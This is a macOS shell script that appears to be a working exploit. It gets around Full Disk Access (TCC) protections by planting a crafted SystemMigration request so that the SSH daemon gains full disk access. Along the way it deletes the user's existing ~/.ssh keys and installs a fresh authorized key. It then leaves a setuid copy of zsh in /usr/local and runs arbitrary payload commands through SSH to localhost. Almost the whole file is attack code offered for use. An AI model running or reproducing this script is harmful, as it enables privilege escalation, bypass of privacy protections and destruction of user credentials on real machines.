#!/bin/sh

launchctl print "system/com.openssh.sshd" &> /dev/null

if [[ $? != 0 ]]; then
    launchctl load -w "/System/Library/LaunchDaemons/ssh.plist"

    echo "SSH daemon started. Waiting 10 seconds..."
    sleep 10
else
    echo "SSH daemon already loaded. Continuing."
fi

su "$(logname)" << EOF
rm -rf "${HOME}/.ssh" && mkdir "${HOME}/.ssh"
ssh-keygen -f "${HOME}/.ssh/id_rsa" -N "" &> /dev/null
cp "${HOME}/.ssh/id_rsa.pub" "${HOME}/.ssh/authorized_keys"
EOF

ssh -i "${HOME}/.ssh/id_rsa" "$(logname)@localhost" "ls \"${HOME}/Library/Safari\"" &> /dev/null

if [[ $? != 0 ]]; then
    launchctl kill -9 "system/com.apple.installandsetup.systemmigrationd" &> /dev/null
    rm -rf "/Library/SystemMigration/Queue/"*

    xattr -c "resources/gdate"
    MIGRATION_REQUEST="/Library/SystemMigration/Queue/MigrationRequest-$(( $(resources/gdate +%s) - 978307200 )).$(resources/gdate +%6N)"
    TMPDIR="$(mktemp -d)"

    cp "resources/migration-request.plist" "${TMPDIR}"
    mv "${TMPDIR}/migration-request.plist" "${MIGRATION_REQUEST}"

    echo "Migration request sent. Waiting 30 seconds..."
    sleep 30

    while ! ssh -i "${HOME}/.ssh/id_rsa" "$(logname)@localhost" "ls \"${HOME}/Library/Safari\"" &> /dev/null
    do
        echo "Full Disk Access not yet granted. (This may repeat a few times.) Waiting another 30 seconds..."
        sleep 30
    done

    launchctl kill -9 "system/com.apple.installandsetup.systemmigrationd" &> /dev/null
    rm -rf "/Library/SystemMigration/Queue/"*
else
    echo "SSH daemon already has Full Disk Access. Continuing."
fi

cp "/bin/zsh" "/usr/local/zsh"
chmod u+s "/usr/local/zsh"

PAYLOAD=""
for ARG in "$@"
do
    PAYLOAD+=" $( printf "%q" "${ARG}" )"
done
PAYLOAD="$( printf "%q" "${PAYLOAD:1}" )"

echo "\n-------------- Output: --------------\n"

ssh -i "${HOME}/.ssh/id_rsa" "$(logname)@localhost" "cd ${PWD} && /usr/local/zsh -c ${PAYLOAD}"

echo "\n-------------------------------------\n"
echo "Done."
